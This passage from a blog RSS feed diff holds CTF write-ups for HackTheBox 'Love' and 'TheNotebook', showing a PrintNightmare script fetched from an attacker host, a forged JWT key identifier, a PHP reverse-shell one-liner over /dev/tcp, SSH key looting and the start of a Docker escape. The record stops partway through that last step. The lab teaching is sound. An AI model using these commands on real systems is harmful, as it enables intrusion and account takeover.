+>PrintNightmare</a>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Get-Service -name spooler
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Status   Name               DisplayName
+</span></span><span class="line"><span class="cl">------   ----               -----------
+</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Invoke-Nightmare
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; net user
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">adm1n                    Administrator            DefaultAccount           
+</span></span><span class="line"><span class="cl">Guest                    iamf                     Phoebe                   
+</span></span><span class="line"><span class="cl">WDAGUtilityAccount       
+</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.</span></span></code></pre>
+</figure><p>I can login via WinRM.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.239 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
+</span></span><span class="line"><span class="cl">Love</span></span></code></pre>
+</figure>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - TheNotebook</title>
+      <link>https://fahmifj.github.io/ctf/hackthebox/thenotebook/</link>
+      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/ctf/hackthebox/thenotebook/</guid>
+      <description>Abusing JWT key identifier and breaking out of a Docker container</description>
+      <content:encoded><![CDATA[<p>TheNotebook from Hack The Box hosts a web-based note application and it uses a JWT token for its authentication cookie. The token can be forged to escalate myself to admin. With admin-level access, it is possible to drop a PHP web shell using the upload functionality, resulting in shell access to the system. Enumerating on the system discovers a backup file that contains SSH keys of a user. The user is allowed run a Docker container with <code>sudo</code> permissions. The Docker version in this machine is vulnerable to CVE-2019-5736. Along with the <code>sudo</code> permissions, the Docker vulnerability can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>JWT Key ID</li>
+<li>Docker breakout using CVE-2019-573</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li><a href="https://jwt.io"target="_blank" rel="noopener noreferrer"
+>https://jwt.io</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ fscan 10.10.10.230 thenotebook
+</span></span><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+</span></span><span class="line"><span class="cl">nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.230
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Notebook - Your Note Keeper
+</span></span><span class="line"><span class="cl">10010/tcp filtered rxapi
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds</span></span></code></pre>
+</figure><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  /></div>
+</p>
+<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
+<p><div class="img-container"><img src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  /></div>
+</p>
+<p>And the site automatically logs me in.</p>
+<p><div class="img-container"><img src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  /></div>
+</p>
+<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  /></div>
+</p>
+<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
+<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
+</span></span><span class="line"><span class="cl">Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">12</span>
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1710</span>
+</span></span><span class="line"><span class="cl">Connection: keep-alive</span></span></code></pre>
+</figure><h4 id="gobuster">Gobuster</h4>
+<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
+</span></span><span class="line"><span class="cl">                                                                          
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/08/07 02:44:49 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span></span></span></code></pre>
+</figure><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
+<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
+<p><div class="img-container"><img src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  /></div>
+</p>
+<blockquote>
+<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
+</blockquote>
+<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/"target="_blank" rel="noopener noreferrer"
+>jwt.io</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  /></div>
+</p>
+<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17»
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span></span></span></code></pre>
+</figure><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17»
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
+</span></span><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9</span></span></code></pre>
+</figure><p>I will put back the forged header to the <code>auth</code> cookie and setup a Python web server afterwards.</p>
+<p>When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
+<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to <code>true</code> and so the app will look for my private key and eventually validates my forged token using that key.</p>
+<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using Python web server.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
+</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
+</span></span><span class="line"><span class="cl">Your identification has been saved in privKey.key
+</span></span><span class="line"><span class="cl">Your public key has been saved in privKey.key.pub
+</span></span><span class="line"><span class="cl">The key fingerprint is:
+</span></span><span class="line"><span class="cl">SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
+</span></span><span class="line"><span class="cl">The key<span class="err">&#39;</span>s randomart image is:
+</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>        .o.      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>o .   .. .o.     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> B + ++.o+.      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>.B.X   +S..      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ...*.           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>  oB+            <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+</span></span></code></pre>
+</figure><p>I will head to <a href="https://jwt.io/"target="_blank" rel="noopener noreferrer"
+>jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
+<p><div class="img-container"><img src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  /></div>
+</p>
+<p>When I refresh the browser, a new menu called &ldquo;Admin Panel&rdquo; pops up.</p>
+<p><div class="img-container"><img src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  /></div>
+</p>
+<p>Clicking the Admin Panel points to <code>/admin</code> where I see two options there: <code>View Notes</code> and <code>Upload File</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  /></div>
+</p>
+<p>The <code>View Notes</code> button links to <code>/admin/viewnotes</code>, and in this page all users&rsquo; note can be viewed by the admin.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  /></div>
+</p>
+<p>Two interesting notes created by the admin are titled: <code>Need to fix config</code> and <code>Backups are scheduled</code>.  The first note contains information about a security issue.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  /></div>
+</p>
+<p>The second note states that the server has regular backups set.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  /></div>
+</p>
+<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
+<p><div class="img-container"><img src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  /></div>
+</p>
+<h4 id="web-shell-upload">Web Shell Upload</h4>
+<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php </span></span></code></pre>
+</figure><p>And the file gets uploaded.</p>
+<p><div class="img-container"><img src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  /></div>
+</p>
+<p>The uploaded file can be accessed at <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. When I visit the link, it processes the PHP code.</p>
+<p><div class="img-container"><img src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  /></div>
+</p>
+<p>I will change the payload with the following PHP reverse shell and then setup a netcat listener.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre>
+</figure><p>When I get the file URL, I will use <code>curl</code> to trigger the reverse shell.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php</span></span></code></pre>
+</figure><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ </span></span></code></pre>
+</figure><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I will upgrade my shell to fully interactive one.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@thenotebook:~/html$ which script
+</span></span><span class="line"><span class="cl">which script
+</span></span><span class="line"><span class="cl">/usr/bin/script
+</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ script /dev/null -c bash
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Script started, file is /dev/null
+</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ ^Z
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
+</span></span><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
+</span></span><span class="line"><span class="cl">www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm</span></span></code></pre>
+</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-noah">Shell as noah</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>. I will grab that file to my attacking machine.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">/var/backups/home.tar.gz
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><p>The file contains an SSH private key for user <code>noah</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ tar -zxvf home.tar.gz
+</span></span><span class="line"><span class="cl">home/
+</span></span><span class="line"><span class="cl">home/noah/
+</span></span><span class="line"><span class="cl">home/noah/.bash_logout
+</span></span><span class="line"><span class="cl">home/noah/.cache/
+</span></span><span class="line"><span class="cl">home/noah/.cache/motd.legal-displayed
+</span></span><span class="line"><span class="cl">home/noah/.gnupg/
+</span></span><span class="line"><span class="cl">home/noah/.gnupg/private-keys-v1.d/
+</span></span><span class="line"><span class="cl">home/noah/.bashrc
+</span></span><span class="line"><span class="cl">home/noah/.profile
+</span></span><span class="line"><span class="cl">home/noah/.ssh/
+</span></span><span class="line"><span class="cl">home/noah/.ssh/id_rsa
+</span></span><span class="line"><span class="cl">home/noah/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">home/noah/.ssh/id_rsa.pub</span></span></code></pre>
+</figure><h4 id="ssh---noah">SSH - noah</h4>
+<p>With the obtained private key, I can SSH login as <strong>noah</strong> .</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17» 
+</span></span><span class="line"><span class="cl">$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.03              Processes:              <span class="m">184</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+</span></span><span class="line"><span class="cl">  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
+</span></span><span class="line"><span class="cl">noah@thenotebook:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span></span></span></code></pre>
+</figure><p>User flag is done here.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
+</span></span><span class="line"><span class="cl">*881626900**9*271**710*266*9427*</span></span></code></pre>
+</figure><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User <strong>noah</strong> is allowed to run an interactive shell command to a container named <code>webapp-dev01</code> as root.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> noah on thenotebook:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User noah may run the following commands on thenotebook:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*</span></span></code></pre>
+</figure><p>And the currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/"target="_blank" rel="noopener noreferrer"
+>here</a>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ docker version
+</span></span><span class="line"><span class="cl">Client:
+</span></span><span class="line"><span class="cl"> Version:           18.06.0-ce
+</span></span><span class="line"><span class="cl"> API version:       1.38
+</span></span><span class="line"><span class="cl"> Go version:        go1.10.3
+</span></span><span class="line"><span class="cl"> Git commit:        0ffa825
+</span></span><span class="line"><span class="cl"> Built:             Wed Jul <span class="m">18</span> 19:09:54 <span class="m">2018</span>
+</span></span><span class="line"><span class="cl"> OS/Arch:           linux/amd64
+</span></span><span class="line"><span class="cl"> Experimental:      <span class="nb">false</span>
